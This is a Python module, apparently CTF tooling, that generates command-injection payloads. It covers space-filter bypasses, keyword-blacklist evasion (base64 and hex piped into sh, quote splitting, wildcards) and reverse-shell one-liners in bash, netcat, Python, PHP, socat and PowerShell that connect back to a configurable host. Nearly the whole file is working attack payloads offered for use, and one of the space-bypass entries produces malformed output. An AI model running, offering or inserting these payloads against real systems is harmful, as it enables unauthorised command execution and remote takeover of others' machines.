"""
Command Injection & Reverse Shell Crafter for Web CTF challenges.
Provides space bypasses, keyword blacklisting evasion, and multi-language reverse shells.
"""

import base64
from typing import List, Dict

def get_space_bypasses(cmd: str = "cat /etc/passwd") -> List[Dict[str, str]]:
    """Generate commands with space bypass techniques."""
    parts = cmd.split()
    if len(parts) < 2:
        return []
    
    first = parts[0]
    rest = parts[1:]
    rest_joined = " ".join(rest)
    
    return [
        {
            "name": "Bypass with ${IFS}",
            "payload": f"{first}${{IFS}}{'${IFS}'.join(rest)}",
            "desc": "Uses standard bash Internal Field Separator variable."
        },
        {
            "name": "Bypass with $IFS$9",
            "payload": f"{first}$IFS$9{'$IFS$9'.join(rest)}",
            "desc": "Uses $IFS with positional parameter 9 (evaluates to space)."
        },
        {
            "name": "Bypass with Brace Expansion {cmd,arg}",
            "payload": f"{{{','.join(parts)}}}",
            "desc": "Brace expansion syntax without any space character."
        },
        {
            "name": "Bypass with Redirection (<)",
            "payload": f"{first}<{rest[0]}",
            "desc": "Direct input redirection (useful for cat, head, tail, etc.)."
        },
        {
            "name": "Bypass with Tab (%09 / \\t)",
            "payload": f"{first}\t{'\t'.join(rest)}",
            "desc": "Horizontal tab character in place of space."
        },
        {
            "name": "Bypass with $'\x20'",
            "payload": f"{first}$'\\x20'{'$single_quote\\x20'.join(rest)}",
            "desc": "ANSI-C Quoting space representation."
        }
    ]

def get_keyword_bypasses(cmd: str = "cat /etc/passwd") -> List[Dict[str, str]]:
    """Generate evasion payloads for blacklisted keywords (e.g. cat, etc, passwd, flag, sh)."""
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    hex_cmd = cmd.encode().hex()
    
    return [
        {
            "name": "Base64 Execution Pipe",
            "payload": f"echo {b64_cmd}|base64 -d|sh",
            "desc": "Encodes entire command in Base64 and executes via sh pipe."
        },
        {
            "name": "Base64 Execution via Bash",
            "payload": f"bash<<<$(base64 -d<<<{b64_cmd})",
            "desc": "Here-string Base64 decoding into bash."
        },
        {
            "name": "Hex Execution Pipe",
            "payload": f"echo {hex_cmd}|xxd -r -p|sh",
            "desc": "Executes raw hex encoded command via xxd."
        },
        {
            "name": "Quote Splitting Concatenation",
            "payload": cmd.replace("cat", "c''a\"\"t").replace("passwd", "pass''wd").replace("flag", "fl''ag"),
            "desc": "Inserts empty quotes inside keywords to break regex matching."
        },
        {
            "name": "Backslash Escapes",
            "payload": "\\".join(list(cmd)),
            "desc": "Escapes every single character with backslash (bash strips backslashes)."
        },
        {
            "name": "Wildcards (* and ?)",
            "payload": "/???/??t /???/p??s??",
            "desc": "Matches /bin/cat /etc/passwd using wildcards without letters."
        },
        {
            "name": "Variable Concatenation",
            "payload": f"a={cmd[:3]}; b={cmd[3:]}; $a$b",
            "desc": "Splits command across shell variables and concatenates."
        },
        {
            "name": "Reversed String Execution",
            "payload": f"$(rev<<<'{cmd[::-1]}')",
            "desc": "Reverses the command string and un-reverses at runtime."
        }
    ]

def get_reverse_shells(ip: str = "10.10.14.1", port: int = 4444) -> List[Dict[str, str]]:
    """Generate reverse shells for multiple languages and tools."""
    return [
        {
            "name": "Bash -i TCP",
            "payload": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "desc": "Standard interactive Bash reverse shell over TCP."
        },
        {
            "name": "Bash TCP (Descriptor 196)",
            "payload": f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            "desc": "Reliable descriptor redirection for stubborn shells."
        },
        {
            "name": "Netcat (with -e)",
            "payload": f"nc -e /bin/sh {ip} {port}",
            "desc": "Classic netcat with execute flag."
        },
        {
            "name": "Netcat OpenBSD (mkfifo FIFO pipe)",
            "payload": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "desc": "FIFO pipe reverse shell for modern Linux netcat without -e."
        },
        {
            "name": "Python3 Interactive Socket",
            "payload": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
            "desc": "Fully interactive Python 3 PTY reverse shell."
        },
        {
            "name": "PHP exec Reverse Shell",
            "payload": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "desc": "Compact PHP one-liner reverse shell."
        },
        {
            "name": "Socat Reverse Shell",
            "payload": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
            "desc": "Full TTY socat reverse shell (supports tab completion)."
        },
        {
            "name": "PowerShell TCP Client",
            "payload": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "desc": "Windows PowerShell one-liner reverse shell."
        }
    ]
